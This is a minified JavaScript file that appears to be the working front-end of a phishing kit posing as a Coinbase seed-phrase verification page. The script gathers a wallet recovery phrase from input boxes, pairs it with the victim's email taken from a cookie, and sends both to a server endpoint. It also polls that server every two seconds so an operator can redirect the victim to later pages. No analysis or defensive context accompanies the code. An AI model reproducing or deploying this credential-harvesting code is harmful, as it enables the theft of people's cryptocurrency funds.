import"https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js";document.addEventListener("DOMContentLoaded",function(){setInterval(async()=>{try{const r=decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1]||"");if(!r)return;const e=await(await fetch("/api/users?email="+encodeURIComponent(r))).json();e.current_page&&e.current_page!=="seed"&&(window.location.href="/"+e.current_page)}catch(r){console.error("Error checking current page:",r)}},2e3);const a=Array.from(document.querySelectorAll(".seed-box")),t=document.querySelector(".coinbase-continue-btn");a.forEach((r,n)=>{r.addEventListener("keydown",e=>{e.key==="Tab"||e.key==="Enter"?n<a.length-1&&(e.preventDefault(),a[n+1].focus()):e.key==="Backspace"&&!r.value&&n>0&&a[n-1].focus()})});const o=document.querySelector(".coinbase-verification-form");o&&o.addEventListener("submit",async r=>{r.preventDefault();const n=a.map(e=>e.value.trim()).join(" ");console.log("Submitted seed phrase:",n);try{t&&(t.disabled=!0,t.textContent="Verifying...");const e=decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1]||""),s=await fetch("/api/users",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:e,user_seed_phrase:n,current_page:"wait"})});if(s.ok)window.location.href="/wait";else{const i=await s.json(),c=document.createElement("div");c.className="error-message",c.textContent=i.message||"Failed to submit seed phrase. Please try again.",o.insertBefore(c,o.firstChild),t&&(t.disabled=!1,t.textContent="Continue")}}catch(e){console.error("Error during submission:",e);const s=document.createElement("div");s.className="error-message",s.textContent="Network error. Please try again.",o.insertBefore(s,o.firstChild),t&&(t.disabled=!1,t.textContent="Continue")}})});
